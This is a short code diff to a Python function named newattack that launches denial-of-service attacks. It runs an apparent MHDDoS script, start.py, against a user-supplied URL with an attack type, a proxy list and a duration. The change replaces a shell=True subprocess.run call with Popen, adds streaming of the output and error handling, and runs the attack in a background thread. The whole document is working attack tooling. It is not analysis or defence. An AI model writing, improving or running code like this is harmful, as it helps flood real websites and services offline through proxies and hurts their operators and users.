@@ -68,16 +68,26 @@ def newattack():
             global out
             arguments = [f"{type_attack}", f"{url}", str(0), str(100), "proxies.txt", f"{time}"]
             command = ["python3", "data/mhddos/start.py"] + arguments
-            process = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
-            
-            out = ""
-            for line in process.stdout:
-                out += line + "\n"
-            for line in process.stderr:
-                out += line + "\n"
-            
-            LOGS.info(f"Attack output: {out}")
-            LOGS.info("Attack completed")
+
+            try:
+                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+
+                out = ""
+                for stdout_line in iter(process.stdout.readline, ""):
+                    out += stdout_line
+                for stderr_line in iter(process.stderr.readline, ""):
+                    out += stderr_line
+
+                process.stdout.close()
+                process.stderr.close()
+                process.wait()
+
+                LOGS.info(f"Attack output: {out}")
+                LOGS.info("Attack completed")
+
+            except Exception as e:
+                out = f"Error running attack: {e}"
+                LOGS.error(out)
 
         attack_thread = threading.Thread(target=run_attack)
         attack_thread.start()
